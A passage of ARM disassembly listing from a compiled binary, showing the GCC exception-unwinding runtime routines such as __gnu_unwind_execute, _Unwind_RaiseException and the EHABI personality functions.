   1e620:	e31c0101 	tst	ip, #1073741824	; 0x40000000
   1e624:	138c4102 	orrne	r4, ip, #-2147483648	; 0x80000000
   1e628:	03cc4102 	biceq	r4, ip, #-2147483648	; 0x80000000
   1e62c:	e5883038 	str	r3, [r8, #56]	; 0x38
   1e630:	e1a00008 	mov	r0, r8
   1e634:	e59f3068 	ldr	r3, [pc, #104]	; 1e6a4 <__gnu_unwind_pr_common+0x544>
   1e638:	e59dc014 	ldr	ip, [sp, #20]
   1e63c:	e79cc003 	ldr	ip, [ip, r3]
   1e640:	e1a0e00f 	mov	lr, pc
   1e644:	e12fff1c 	bx	ip
   1e648:	e3500000 	cmp	r0, #0
   1e64c:	0affff3b 	beq	1e340 <__gnu_unwind_pr_common+0x1e0>
   1e650:	e084c007 	add	ip, r4, r7
   1e654:	e3a01000 	mov	r1, #0
   1e658:	e58dc038 	str	ip, [sp, #56]	; 0x38
   1e65c:	e59dc00c 	ldr	ip, [sp, #12]
   1e660:	e1a0000b 	mov	r0, fp
   1e664:	e3a0200f 	mov	r2, #15
   1e668:	e1a03001 	mov	r3, r1
   1e66c:	e58dc000 	str	ip, [sp]
   1e670:	ebfffcf6 	bl	1da50 <_Unwind_VRS_Set>
   1e674:	e3a00007 	mov	r0, #7
   1e678:	eaffff31 	b	1e344 <__gnu_unwind_pr_common+0x1e4>
   1e67c:	e1a0310a 	lsl	r3, sl, #2
   1e680:	e790c003 	ldr	ip, [r0, r3]
   1e684:	e31c0101 	tst	ip, #1073741824	; 0x40000000
   1e688:	e0803003 	add	r3, r0, r3
   1e68c:	138cc102 	orrne	ip, ip, #-2147483648	; 0x80000000
   1e690:	03ccc102 	biceq	ip, ip, #-2147483648	; 0x80000000
   1e694:	eaffffad 	b	1e550 <__gnu_unwind_pr_common+0x3f0>
   1e698:	0000a804 	.word	0x0000a804
   1e69c:	00000020 	.word	0x00000020
   1e6a0:	00000064 	.word	0x00000064
   1e6a4:	0000001c 	.word	0x0000001c

0001e6a8 <__aeabi_unwind_cpp_pr2>:
   1e6a8:	e3a03002 	mov	r3, #2
   1e6ac:	eafffeab 	b	1e160 <__gnu_unwind_pr_common>

0001e6b0 <__aeabi_unwind_cpp_pr1>:
   1e6b0:	e3a03001 	mov	r3, #1
   1e6b4:	eafffea9 	b	1e160 <__gnu_unwind_pr_common>

0001e6b8 <__aeabi_unwind_cpp_pr0>:
   1e6b8:	e3a03000 	mov	r3, #0
   1e6bc:	eafffea7 	b	1e160 <__gnu_unwind_pr_common>

0001e6c0 <__restore_core_regs>:
   1e6c0:	e2801034 	add	r1, r0, #52	; 0x34
   1e6c4:	e8910038 	ldm	r1, {r3, r4, r5}
   1e6c8:	e1a02005 	mov	r2, r5
   1e6cc:	e92d001c 	push	{r2, r3, r4}
   1e6d0:	e8900fff 	ldm	r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp}
   1e6d4:	e89d7000 	ldm	sp, {ip, sp, lr}
   1e6d8:	e12fff1c 	bx	ip

0001e6dc <__gnu_Unwind_Restore_VFP>:
   1e6dc:	ec900b21 	fldmiax	r0, {d0-d15}	;@ Deprecated
   1e6e0:	e12fff1e 	bx	lr

0001e6e4 <__gnu_Unwind_Save_VFP>:
   1e6e4:	ec800b21 	fstmiax	r0, {d0-d15}	;@ Deprecated
   1e6e8:	e12fff1e 	bx	lr

0001e6ec <_Unwind_RaiseException>:
   1e6ec:	e92de000 	push	{sp, lr, pc}
   1e6f0:	e92d1fff 	push	{r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip}
   1e6f4:	e3a03000 	mov	r3, #0
   1e6f8:	e92d000c 	push	{r2, r3}
   1e6fc:	e28d1004 	add	r1, sp, #4
   1e700:	ebfffe0f 	bl	1df44 <__gnu_Unwind_RaiseException>
   1e704:	e59de040 	ldr	lr, [sp, #64]	; 0x40
   1e708:	e28dd048 	add	sp, sp, #72	; 0x48
   1e70c:	e12fff1e 	bx	lr

0001e710 <_Unwind_Resume>:
   1e710:	e92de000 	push	{sp, lr, pc}
   1e714:	e92d1fff 	push	{r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip}
   1e718:	e3a03000 	mov	r3, #0
   1e71c:	e92d000c 	push	{r2, r3}
   1e720:	e28d1004 	add	r1, sp, #4
   1e724:	ebfffdeb 	bl	1ded8 <__gnu_Unwind_Resume>
   1e728:	e59de040 	ldr	lr, [sp, #64]	; 0x40
   1e72c:	e28dd048 	add	sp, sp, #72	; 0x48
   1e730:	e12fff1e 	bx	lr

0001e734 <_Unwind_Resume_or_Rethrow>:
   1e734:	e92de000 	push	{sp, lr, pc}
   1e738:	e92d1fff 	push	{r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip}
   1e73c:	e3a03000 	mov	r3, #0
   1e740:	e92d000c 	push	{r2, r3}
   1e744:	e28d1004 	add	r1, sp, #4
   1e748:	ebfffe2b 	bl	1dffc <__gnu_Unwind_Resume_or_Rethrow>
   1e74c:	e59de040 	ldr	lr, [sp, #64]	; 0x40
   1e750:	e28dd048 	add	sp, sp, #72	; 0x48
   1e754:	e12fff1e 	bx	lr

0001e758 <_Unwind_ForcedUnwind>:
   1e758:	e92de000 	push	{sp, lr, pc}
   1e75c:	e92d1fff 	push	{r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip}
   1e760:	e3a03000 	mov	r3, #0
   1e764:	e92d000c 	push	{r2, r3}
   1e768:	e28d3004 	add	r3, sp, #4
   1e76c:	ebfffdba 	bl	1de5c <__gnu_Unwind_ForcedUnwind>
   1e770:	e59de040 	ldr	lr, [sp, #64]	; 0x40
   1e774:	e28dd048 	add	sp, sp, #72	; 0x48
   1e778:	e12fff1e 	bx	lr

0001e77c <_Unwind_GetLanguageSpecificData>:
   1e77c:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1e780:	e3a01000 	mov	r1, #0
   1e784:	e24dd014 	sub	sp, sp, #20
   1e788:	e3a0200c 	mov	r2, #12
   1e78c:	e08dc002 	add	ip, sp, r2
   1e790:	e1a03001 	mov	r3, r1
   1e794:	e58dc000 	str	ip, [sp]
   1e798:	ebfffc99 	bl	1da04 <_Unwind_VRS_Get>
   1e79c:	e59d200c 	ldr	r2, [sp, #12]
   1e7a0:	e592304c 	ldr	r3, [r2, #76]	; 0x4c
   1e7a4:	e5d30007 	ldrb	r0, [r3, #7]
   1e7a8:	e2833008 	add	r3, r3, #8
   1e7ac:	e1a00100 	lsl	r0, r0, #2
   1e7b0:	e0830000 	add	r0, r3, r0
   1e7b4:	e28dd014 	add	sp, sp, #20
   1e7b8:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   1e7bc:	e12fff1e 	bx	lr

0001e7c0 <__gnu_unwind_execute>:
   1e7c0:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   1e7c4:	e1a07000 	mov	r7, r0
   1e7c8:	e24dd014 	sub	sp, sp, #20
   1e7cc:	e1a05001 	mov	r5, r1
   1e7d0:	e3a0a000 	mov	sl, #0
   1e7d4:	e5d53008 	ldrb	r3, [r5, #8]
   1e7d8:	e3530000 	cmp	r3, #0
   1e7dc:	12433001 	subne	r3, r3, #1
   1e7e0:	15c53008 	strbne	r3, [r5, #8]
   1e7e4:	1a000009 	bne	1e810 <__gnu_unwind_execute+0x50>
   1e7e8:	e5d53009 	ldrb	r3, [r5, #9]
   1e7ec:	e3530000 	cmp	r3, #0
   1e7f0:	0a00003e 	beq	1e8f0 <__gnu_unwind_execute+0x130>
   1e7f4:	e2433001 	sub	r3, r3, #1
   1e7f8:	e5c53009 	strb	r3, [r5, #9]
   1e7fc:	e5952004 	ldr	r2, [r5, #4]
   1e800:	e4920004 	ldr	r0, [r2], #4
   1e804:	e3a03003 	mov	r3, #3
   1e808:	e8850005 	stm	r5, {r0, r2}
   1e80c:	e5c53008 	strb	r3, [r5, #8]
   1e810:	e5950000 	ldr	r0, [r5]
   1e814:	e1a04c20 	lsr	r4, r0, #24
   1e818:	e204c0ff 	and	ip, r4, #255	; 0xff
   1e81c:	e1a00400 	lsl	r0, r0, #8
   1e820:	e35c00b0 	cmp	ip, #176	; 0xb0
   1e824:	e5850000 	str	r0, [r5]
   1e828:	0a000030 	beq	1e8f0 <__gnu_unwind_execute+0x130>
   1e82c:	e2141080 	ands	r1, r4, #128	; 0x80
   1e830:	0a000034 	beq	1e908 <__gnu_unwind_execute+0x148>
   1e834:	e20460f0 	and	r6, r4, #240	; 0xf0
   1e838:	e3560080 	cmp	r6, #128	; 0x80
   1e83c:	1a000048 	bne	1e964 <__gnu_unwind_execute+0x1a4>
   1e840:	e5d53008 	ldrb	r3, [r5, #8]
   1e844:	e3530000 	cmp	r3, #0
   1e848:	12433001 	subne	r3, r3, #1
   1e84c:	15c53008 	strbne	r3, [r5, #8]
   1e850:	1a00000b 	bne	1e884 <__gnu_unwind_execute+0xc4>
   1e854:	e5d53009 	ldrb	r3, [r5, #9]
   1e858:	e3530000 	cmp	r3, #0
   1e85c:	03a020b0 	moveq	r2, #176	; 0xb0
   1e860:	0a00000b 	beq	1e894 <__gnu_unwind_execute+0xd4>
   1e864:	e2433001 	sub	r3, r3, #1
   1e868:	e5c53009 	strb	r3, [r5, #9]
   1e86c:	e5952004 	ldr	r2, [r5, #4]
   1e870:	e4920004 	ldr	r0, [r2], #4
   1e874:	e3a03003 	mov	r3, #3
   1e878:	e5852004 	str	r2, [r5, #4]
   1e87c:	e5c53008 	strb	r3, [r5, #8]
   1e880:	e5850000 	str	r0, [r5]
   1e884:	e1a03000 	mov	r3, r0
   1e888:	e1a00400 	lsl	r0, r0, #8
   1e88c:	e5850000 	str	r0, [r5]
   1e890:	e1a02c23 	lsr	r2, r3, #24
   1e894:	e182240c 	orr	r2, r2, ip, lsl #8
   1e898:	e3520902 	cmp	r2, #32768	; 0x8000
   1e89c:	0a000080 	beq	1eaa4 <__gnu_unwind_execute+0x2e4>
   1e8a0:	e1a04202 	lsl	r4, r2, #4
   1e8a4:	e3c4200f 	bic	r2, r4, #15
   1e8a8:	e3a01000 	mov	r1, #0
   1e8ac:	e1a02802 	lsl	r2, r2, #16
   1e8b0:	e1a02822 	lsr	r2, r2, #16
   1e8b4:	e1a00007 	mov	r0, r7
   1e8b8:	e1a03001 	mov	r3, r1
   1e8bc:	ebfffdd6 	bl	1e01c <_Unwind_VRS_Pop>
   1e8c0:	e3500000 	cmp	r0, #0
   1e8c4:	1a000076 	bne	1eaa4 <__gnu_unwind_execute+0x2e4>
   1e8c8:	e5d53008 	ldrb	r3, [r5, #8]
   1e8cc:	e3140902 	tst	r4, #32768	; 0x8000
   1e8d0:	13a0a001 	movne	sl, #1
   1e8d4:	e3530000 	cmp	r3, #0
   1e8d8:	12433001 	subne	r3, r3, #1
   1e8dc:	15c53008 	strbne	r3, [r5, #8]
   1e8e0:	1affffca 	bne	1e810 <__gnu_unwind_execute+0x50>
   1e8e4:	e5d53009 	ldrb	r3, [r5, #9]
   1e8e8:	e3530000 	cmp	r3, #0
   1e8ec:	1affffc0 	bne	1e7f4 <__gnu_unwind_execute+0x34>
   1e8f0:	e35a0000 	cmp	sl, #0
   1e8f4:	13a00000 	movne	r0, #0
   1e8f8:	0a00002e 	beq	1e9b8 <__gnu_unwind_execute+0x1f8>
   1e8fc:	e28dd014 	add	sp, sp, #20
   1e900:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   1e904:	e12fff1e 	bx	lr
   1e908:	e204c03f 	and	ip, r4, #63	; 0x3f
   1e90c:	e1a0c10c 	lsl	ip, ip, #2
   1e910:	e1a03001 	mov	r3, r1
   1e914:	e28d800c 	add	r8, sp, #12
   1e918:	e1a00007 	mov	r0, r7
   1e91c:	e3a0200d 	mov	r2, #13
   1e920:	e28c6004 	add	r6, ip, #4
   1e924:	e58d8000 	str	r8, [sp]
   1e928:	ebfffc35 	bl	1da04 <_Unwind_VRS_Get>
   1e92c:	e3140040 	tst	r4, #64	; 0x40
   1e930:	159d300c 	ldrne	r3, [sp, #12]
   1e934:	059d300c 	ldreq	r3, [sp, #12]
   1e938:	e3a01000 	mov	r1, #0
   1e93c:	1066c003 	rsbne	ip, r6, r3
   1e940:	0083c006 	addeq	ip, r3, r6
   1e944:	e1a00007 	mov	r0, r7
   1e948:	e3a0200d 	mov	r2, #13
   1e94c:	e1a03001 	mov	r3, r1
   1e950:	158dc00c 	strne	ip, [sp, #12]
   1e954:	058dc00c 	streq	ip, [sp, #12]
   1e958:	e58d8000 	str	r8, [sp]
   1e95c:	ebfffc3b 	bl	1da50 <_Unwind_VRS_Set>
   1e960:	eaffff9b 	b	1e7d4 <__gnu_unwind_execute+0x14>
   1e964:	e3560090 	cmp	r6, #144	; 0x90
   1e968:	1a00004f 	bne	1eaac <__gnu_unwind_execute+0x2ec>
   1e96c:	e204200f 	and	r2, r4, #15
   1e970:	e352000f 	cmp	r2, #15
   1e974:	1352000d 	cmpne	r2, #13
   1e978:	13a06000 	movne	r6, #0
   1e97c:	03a06001 	moveq	r6, #1
   1e980:	0a000047 	beq	1eaa4 <__gnu_unwind_execute+0x2e4>
   1e984:	e28d400c 	add	r4, sp, #12
   1e988:	e1a01006 	mov	r1, r6
   1e98c:	e1a03006 	mov	r3, r6
   1e990:	e1a00007 	mov	r0, r7
   1e994:	e58d4000 	str	r4, [sp]
   1e998:	ebfffc19 	bl	1da04 <_Unwind_VRS_Get>
   1e99c:	e1a01006 	mov	r1, r6
   1e9a0:	e1a00007 	mov	r0, r7
   1e9a4:	e3a0200d 	mov	r2, #13
   1e9a8:	e1a03006 	mov	r3, r6
   1e9ac:	e58d4000 	str	r4, [sp]
   1e9b0:	ebfffc26 	bl	1da50 <_Unwind_VRS_Set>
   1e9b4:	eaffff86 	b	1e7d4 <__gnu_unwind_execute+0x14>
   1e9b8:	e28d400c 	add	r4, sp, #12
   1e9bc:	e1a0100a 	mov	r1, sl
   1e9c0:	e3a0200e 	mov	r2, #14
   1e9c4:	e1a0300a 	mov	r3, sl
   1e9c8:	e1a00007 	mov	r0, r7
   1e9cc:	e58d4000 	str	r4, [sp]
   1e9d0:	ebfffc0b 	bl	1da04 <_Unwind_VRS_Get>
   1e9d4:	e1a00007 	mov	r0, r7
   1e9d8:	e1a0100a 	mov	r1, sl
   1e9dc:	e3a0200f 	mov	r2, #15
   1e9e0:	e1a0300a 	mov	r3, sl
   1e9e4:	e58d4000 	str	r4, [sp]
   1e9e8:	ebfffc18 	bl	1da50 <_Unwind_VRS_Set>
   1e9ec:	e1a0000a 	mov	r0, sl
   1e9f0:	eaffffc1 	b	1e8fc <__gnu_unwind_execute+0x13c>
   1e9f4:	e35c00c7 	cmp	ip, #199	; 0xc7
   1e9f8:	0a0000b2 	beq	1ecc8 <__gnu_unwind_execute+0x508>
   1e9fc:	e20430f8 	and	r3, r4, #248	; 0xf8
   1ea00:	e35300c0 	cmp	r3, #192	; 0xc0
   1ea04:	0204200f 	andeq	r2, r4, #15
   1ea08:	02822001 	addeq	r2, r2, #1
   1ea0c:	03a01003 	moveq	r1, #3
   1ea10:	0382280a 	orreq	r2, r2, #655360	; 0xa0000
   1ea14:	0a00002e 	beq	1ead4 <__gnu_unwind_execute+0x314>
   1ea18:	e35c00c8 	cmp	ip, #200	; 0xc8
   1ea1c:	0a00008e 	beq	1ec5c <__gnu_unwind_execute+0x49c>
   1ea20:	e35c00c9 	cmp	ip, #201	; 0xc9
   1ea24:	1a00001e 	bne	1eaa4 <__gnu_unwind_execute+0x2e4>
   1ea28:	e5d53008 	ldrb	r3, [r5, #8]
   1ea2c:	e3530000 	cmp	r3, #0
   1ea30:	12433001 	subne	r3, r3, #1
   1ea34:	15c53008 	strbne	r3, [r5, #8]
   1ea38:	1a00000c 	bne	1ea70 <__gnu_unwind_execute+0x2b0>
   1ea3c:	e5d53009 	ldrb	r3, [r5, #9]
   1ea40:	e3530000 	cmp	r3, #0
   1ea44:	03a0280b 	moveq	r2, #720896	; 0xb0000
   1ea48:	02822001 	addeq	r2, r2, #1
   1ea4c:	0a00000e 	beq	1ea8c <__gnu_unwind_execute+0x2cc>
   1ea50:	e2433001 	sub	r3, r3, #1
   1ea54:	e5c53009 	strb	r3, [r5, #9]
   1ea58:	e5952004 	ldr	r2, [r5, #4]
   1ea5c:	e4920004 	ldr	r0, [r2], #4
   1ea60:	e3a03003 	mov	r3, #3
   1ea64:	e5852004 	str	r2, [r5, #4]
   1ea68:	e5c53008 	strb	r3, [r5, #8]
   1ea6c:	e5850000 	str	r0, [r5]
   1ea70:	e1a03c20 	lsr	r3, r0, #24
   1ea74:	e203100f 	and	r1, r3, #15
   1ea78:	e1a02400 	lsl	r2, r0, #8
   1ea7c:	e2811001 	add	r1, r1, #1
   1ea80:	e20330f0 	and	r3, r3, #240	; 0xf0
   1ea84:	e5852000 	str	r2, [r5]
   1ea88:	e1812603 	orr	r2, r1, r3, lsl #12
   1ea8c:	e1a00007 	mov	r0, r7
   1ea90:	e3a01001 	mov	r1, #1
   1ea94:	e3a03005 	mov	r3, #5
   1ea98:	ebfffd5f 	bl	1e01c <_Unwind_VRS_Pop>
   1ea9c:	e3500000 	cmp	r0, #0
   1eaa0:	0affff4b 	beq	1e7d4 <__gnu_unwind_execute+0x14>
   1eaa4:	e3a00009 	mov	r0, #9
   1eaa8:	eaffff93 	b	1e8fc <__gnu_unwind_execute+0x13c>
   1eaac:	e35600a0 	cmp	r6, #160	; 0xa0
   1eab0:	1a00000e 	bne	1eaf0 <__gnu_unwind_execute+0x330>
   1eab4:	e1e0300c 	mvn	r3, ip
   1eab8:	e2033007 	and	r3, r3, #7
   1eabc:	e3a02eff 	mov	r2, #4080	; 0xff0
   1eac0:	e1a02352 	asr	r2, r2, r3
   1eac4:	e3140008 	tst	r4, #8
   1eac8:	e2022eff 	and	r2, r2, #4080	; 0xff0
   1eacc:	13822901 	orrne	r2, r2, #16384	; 0x4000
   1ead0:	e3a01000 	mov	r1, #0
   1ead4:	e1a00007 	mov	r0, r7
   1ead8:	e1a03001 	mov	r3, r1
   1eadc:	ebfffd4e 	bl	1e01c <_Unwind_VRS_Pop>
   1eae0:	e3500000 	cmp	r0, #0
   1eae4:	0affff3a 	beq	1e7d4 <__gnu_unwind_execute+0x14>
   1eae8:	e3a00009 	mov	r0, #9
   1eaec:	eaffff82 	b	1e8fc <__gnu_unwind_execute+0x13c>
   1eaf0:	e35600b0 	cmp	r6, #176	; 0xb0
   1eaf4:	0a00000f 	beq	1eb38 <__gnu_unwind_execute+0x378>
   1eaf8:	e35600c0 	cmp	r6, #192	; 0xc0
   1eafc:	0a000039 	beq	1ebe8 <__gnu_unwind_execute+0x428>
   1eb00:	e20430f8 	and	r3, r4, #248	; 0xf8
   1eb04:	e35300d0 	cmp	r3, #208	; 0xd0
   1eb08:	1affffe5 	bne	1eaa4 <__gnu_unwind_execute+0x2e4>
   1eb0c:	e2042007 	and	r2, r4, #7
   1eb10:	e2822001 	add	r2, r2, #1
   1eb14:	e3822702 	orr	r2, r2, #524288	; 0x80000
   1eb18:	e1a00007 	mov	r0, r7
   1eb1c:	e3a01001 	mov	r1, #1
   1eb20:	e24330cb 	sub	r3, r3, #203	; 0xcb
   1eb24:	ebfffd3c 	bl	1e01c <_Unwind_VRS_Pop>
   1eb28:	e3500000 	cmp	r0, #0
   1eb2c:	0affff28 	beq	1e7d4 <__gnu_unwind_execute+0x14>
   1eb30:	e3a00009 	mov	r0, #9
   1eb34:	eaffff70 	b	1e8fc <__gnu_unwind_execute+0x13c>
   1eb38:	e35c00b1 	cmp	ip, #177	; 0xb1
   1eb3c:	0a0000be 	beq	1ee3c <__gnu_unwind_execute+0x67c>
   1eb40:	e35c00b2 	cmp	ip, #178	; 0xb2
   1eb44:	0a000072 	beq	1ed14 <__gnu_unwind_execute+0x554>
   1eb48:	e35c00b3 	cmp	ip, #179	; 0xb3
   1eb4c:	1a00001a 	bne	1ebbc <__gnu_unwind_execute+0x3fc>
   1eb50:	e5d53008 	ldrb	r3, [r5, #8]
   1eb54:	e3530000 	cmp	r3, #0
   1eb58:	12433001 	subne	r3, r3, #1
   1eb5c:	15c53008 	strbne	r3, [r5, #8]
   1eb60:	1a00000c 	bne	1eb98 <__gnu_unwind_execute+0x3d8>
   1eb64:	e5d53009 	ldrb	r3, [r5, #9]
   1eb68:	e3530000 	cmp	r3, #0
   1eb6c:	03a0280b 	moveq	r2, #720896	; 0xb0000
   1eb70:	02822001 	addeq	r2, r2, #1
   1eb74:	0a00000e 	beq	1ebb4 <__gnu_unwind_execute+0x3f4>
   1eb78:	e2433001 	sub	r3, r3, #1
   1eb7c:	e5c53009 	strb	r3, [r5, #9]
   1eb80:	e5952004 	ldr	r2, [r5, #4]
   1eb84:	e4920004 	ldr	r0, [r2], #4
   1eb88:	e3a03003 	mov	r3, #3
   1eb8c:	e5852004 	str	r2, [r5, #4]
   1eb90:	e5c53008 	strb	r3, [r5, #8]
   1eb94:	e5850000 	str	r0, [r5]
   1eb98:	e1a03c20 	lsr	r3, r0, #24
   1eb9c:	e203200f 	and	r2, r3, #15
   1eba0:	e1a00400 	lsl	r0, r0, #8
   1eba4:	e2822001 	add	r2, r2, #1
   1eba8:	e20330f0 	and	r3, r3, #240	; 0xf0
   1ebac:	e5850000 	str	r0, [r5]
   1ebb0:	e1822603 	orr	r2, r2, r3, lsl #12
   1ebb4:	e3a01001 	mov	r1, #1
   1ebb8:	eaffffc5 	b	1ead4 <__gnu_unwind_execute+0x314>
   1ebbc:	e20430fc 	and	r3, r4, #252	; 0xfc
   1ebc0:	e35300b4 	cmp	r3, #180	; 0xb4
   1ebc4:	02042003 	andeq	r2, r4, #3
   1ebc8:	120c2007 	andne	r2, ip, #7
   1ebcc:	02822001 	addeq	r2, r2, #1
   1ebd0:	12822001 	addne	r2, r2, #1
   1ebd4:	03a01002 	moveq	r1, #2
   1ebd8:	03822701 	orreq	r2, r2, #262144	; 0x40000
   1ebdc:	13a01001 	movne	r1, #1
   1ebe0:	13822702 	orrne	r2, r2, #524288	; 0x80000
   1ebe4:	eaffffba 	b	1ead4 <__gnu_unwind_execute+0x314>
   1ebe8:	e35c00c6 	cmp	ip, #198	; 0xc6
   1ebec:	1affff80 	bne	1e9f4 <__gnu_unwind_execute+0x234>
   1ebf0:	e5d53008 	ldrb	r3, [r5, #8]
   1ebf4:	e3530000 	cmp	r3, #0
   1ebf8:	12433001 	subne	r3, r3, #1
   1ebfc:	15c53008 	strbne	r3, [r5, #8]
   1ec00:	1a00000c 	bne	1ec38 <__gnu_unwind_execute+0x478>
   1ec04:	e5d53009 	ldrb	r3, [r5, #9]
   1ec08:	e3530000 	cmp	r3, #0
   1ec0c:	03a0280b 	moveq	r2, #720896	; 0xb0000
   1ec10:	02822001 	addeq	r2, r2, #1
   1ec14:	0a00000e 	beq	1ec54 <__gnu_unwind_execute+0x494>
   1ec18:	e2433001 	sub	r3, r3, #1
   1ec1c:	e5c53009 	strb	r3, [r5, #9]
   1ec20:	e5952004 	ldr	r2, [r5, #4]
   1ec24:	e4920004 	ldr	r0, [r2], #4
   1ec28:	e3a03003 	mov	r3, #3
   1ec2c:	e5852004 	str	r2, [r5, #4]
   1ec30:	e5c53008 	strb	r3, [r5, #8]
   1ec34:	e5850000 	str	r0, [r5]
   1ec38:	e1a03c20 	lsr	r3, r0, #24
   1ec3c:	e203200f 	and	r2, r3, #15
   1ec40:	e1a00400 	lsl	r0, r0, #8
   1ec44:	e2822001 	add	r2, r2, #1
   1ec48:	e20330f0 	and	r3, r3, #240	; 0xf0
   1ec4c:	e5850000 	str	r0, [r5]
   1ec50:	e1822603 	orr	r2, r2, r3, lsl #12
   1ec54:	e3a01003 	mov	r1, #3
   1ec58:	eaffff9d 	b	1ead4 <__gnu_unwind_execute+0x314>
   1ec5c:	e5d53008 	ldrb	r3, [r5, #8]
   1ec60:	e3530000 	cmp	r3, #0
   1ec64:	12433001 	subne	r3, r3, #1
   1ec68:	15c53008 	strbne	r3, [r5, #8]
   1ec6c:	1a00000c 	bne	1eca4 <__gnu_unwind_execute+0x4e4>
   1ec70:	e5d53009 	ldrb	r3, [r5, #9]
   1ec74:	e3530000 	cmp	r3, #0
   1ec78:	03a0280b 	moveq	r2, #720896	; 0xb0000
   1ec7c:	02822001 	addeq	r2, r2, #1
   1ec80:	0a00000e 	beq	1ecc0 <__gnu_unwind_execute+0x500>
   1ec84:	e2433001 	sub	r3, r3, #1
   1ec88:	e5c53009 	strb	r3, [r5, #9]
   1ec8c:	e5952004 	ldr	r2, [r5, #4]
   1ec90:	e4920004 	ldr	r0, [r2], #4
   1ec94:	e3a03003 	mov	r3, #3
   1ec98:	e5852004 	str	r2, [r5, #4]
   1ec9c:	e5c53008 	strb	r3, [r5, #8]
   1eca0:	e5850000 	str	r0, [r5]
   1eca4:	e1a03c20 	lsr	r3, r0, #24
   1eca8:	e203200f 	and	r2, r3, #15
   1ecac:	e1a00400 	lsl	r0, r0, #8
   1ecb0:	e2822001 	add	r2, r2, #1
   1ecb4:	e20330f0 	and	r3, r3, #240	; 0xf0
   1ecb8:	e5850000 	str	r0, [r5]
   1ecbc:	e1822603 	orr	r2, r2, r3, lsl #12
   1ecc0:	e3a01002 	mov	r1, #2
   1ecc4:	eaffff82 	b	1ead4 <__gnu_unwind_execute+0x314>
   1ecc8:	e5d53008 	ldrb	r3, [r5, #8]
   1eccc:	e3530000 	cmp	r3, #0
   1ecd0:	12433001 	subne	r3, r3, #1
   1ecd4:	15c53008 	strbne	r3, [r5, #8]
   1ecd8:	0a000065 	beq	1ee74 <__gnu_unwind_execute+0x6b4>
   1ecdc:	e1a03c20 	lsr	r3, r0, #24
   1ece0:	e21320ff 	ands	r2, r3, #255	; 0xff
   1ece4:	e1a00400 	lsl	r0, r0, #8
   1ece8:	e5850000 	str	r0, [r5]
   1ecec:	0affff6c 	beq	1eaa4 <__gnu_unwind_execute+0x2e4>
   1ecf0:	e21330f0 	ands	r3, r3, #240	; 0xf0
   1ecf4:	1affff6a 	bne	1eaa4 <__gnu_unwind_execute+0x2e4>
   1ecf8:	e1a00007 	mov	r0, r7
   1ecfc:	e3a01004 	mov	r1, #4
   1ed00:	ebfffcc5 	bl	1e01c <_Unwind_VRS_Pop>
   1ed04:	e3500000 	cmp	r0, #0
   1ed08:	0afffeb1 	beq	1e7d4 <__gnu_unwind_execute+0x14>
   1ed0c:	e3a00009 	mov	r0, #9
   1ed10:	eafffef9 	b	1e8fc <__gnu_unwind_execute+0x13c>
   1ed14:	e3a01000 	mov	r1, #0
   1ed18:	e1a03001 	mov	r3, r1
   1ed1c:	e28d800c 	add	r8, sp, #12
   1ed20:	e1a00007 	mov	r0, r7
   1ed24:	e3a0200d 	mov	r2, #13
   1ed28:	e58d8000 	str	r8, [sp]
   1ed2c:	ebfffb34 	bl	1da04 <_Unwind_VRS_Get>
   1ed30:	e5d51008 	ldrb	r1, [r5, #8]
   1ed34:	e3510000 	cmp	r1, #0
   1ed38:	12413001 	subne	r3, r1, #1
   1ed3c:	15c53008 	strbne	r3, [r5, #8]
   1ed40:	1a00000a 	bne	1ed70 <__gnu_unwind_execute+0x5b0>
   1ed44:	e5d53009 	ldrb	r3, [r5, #9]
   1ed48:	e3530000 	cmp	r3, #0
   1ed4c:	01a02006 	moveq	r2, r6
   1ed50:	0a000010 	beq	1ed98 <__gnu_unwind_execute+0x5d8>
   1ed54:	e2433001 	sub	r3, r3, #1
   1ed58:	e5c53009 	strb	r3, [r5, #9]
   1ed5c:	e5952004 	ldr	r2, [r5, #4]
   1ed60:	e4920004 	ldr	r0, [r2], #4
   1ed64:	e3a03003 	mov	r3, #3
   1ed68:	e8850005 	stm	r5, {r0, r2}
   1ed6c:	e5c53008 	strb	r3, [r5, #8]
   1ed70:	e5953000 	ldr	r3, [r5]
   1ed74:	e1a00403 	lsl	r0, r3, #8
   1ed78:	e1a02c23 	lsr	r2, r3, #24
   1ed7c:	e5850000 	str	r0, [r5]
   1ed80:	e3120080 	tst	r2, #128	; 0x80
   1ed84:	059dc00c 	ldreq	ip, [sp, #12]
   1ed88:	e20220ff 	and	r2, r2, #255	; 0xff
   1ed8c:	03a0e002 	moveq	lr, #2
   1ed90:	0a00001c 	beq	1ee08 <__gnu_unwind_execute+0x648>
   1ed94:	e5d51008 	ldrb	r1, [r5, #8]
   1ed98:	e59dc00c 	ldr	ip, [sp, #12]
   1ed9c:	e3a0e002 	mov	lr, #2
   1eda0:	e202307f 	and	r3, r2, #127	; 0x7f
   1eda4:	e08cce13 	add	ip, ip, r3, lsl lr
   1eda8:	e3510000 	cmp	r1, #0
   1edac:	e2413001 	sub	r3, r1, #1
   1edb0:	e58dc00c 	str	ip, [sp, #12]
   1edb4:	e28ee007 	add	lr, lr, #7
   1edb8:	15c53008 	strbne	r3, [r5, #8]
   1edbc:	1a00000a 	bne	1edec <__gnu_unwind_execute+0x62c>
   1edc0:	e5d53009 	ldrb	r3, [r5, #9]
   1edc4:	e3530000 	cmp	r3, #0
   1edc8:	e2430001 	sub	r0, r3, #1
   1edcc:	e3a020b0 	mov	r2, #176	; 0xb0
   1edd0:	0afffff2 	beq	1eda0 <__gnu_unwind_execute+0x5e0>
   1edd4:	e5952004 	ldr	r2, [r5, #4]
   1edd8:	e5c50009 	strb	r0, [r5, #9]
   1eddc:	e4920004 	ldr	r0, [r2], #4
   1ede0:	e3a03003 	mov	r3, #3
   1ede4:	e5c53008 	strb	r3, [r5, #8]
   1ede8:	e8850005 	stm	r5, {r0, r2}
   1edec:	e5953000 	ldr	r3, [r5]
   1edf0:	e1a02c23 	lsr	r2, r3, #24
   1edf4:	e3120080 	tst	r2, #128	; 0x80
